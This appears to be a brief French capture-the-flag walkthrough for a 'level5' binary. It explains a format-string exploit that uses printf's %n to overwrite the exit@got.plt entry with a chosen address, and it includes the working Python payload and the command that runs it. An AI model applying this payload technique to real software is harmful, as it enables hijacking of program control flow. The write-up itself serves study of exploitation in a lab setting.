Comme dans l'exercice precedent on doit ecrire a l'aide du %n de printf mais cette fois on doit ecrire une addresse.

On a juste a la décomposer en int

Pour ecrire l'adresse 0x080484a4 en décimal sa donne 134513828

Le probleme est que l'on doit le remplacer par une adresse qui est appelé, on choisit exit qui est appelé juste après le printf, celui-co aura modifier l'adresse qui pointe sur exit

134513828 - les 4 octets de l'adresse donne 134513824

0x08049838 est l'adresse de exit@got.plt

```bash
python -c "print('\x38\x98\x04\x08' + '%134513824d' + '%4\$n')" > /tmp/exploit5
cat /tmp/exploit5 - | ./level5
```
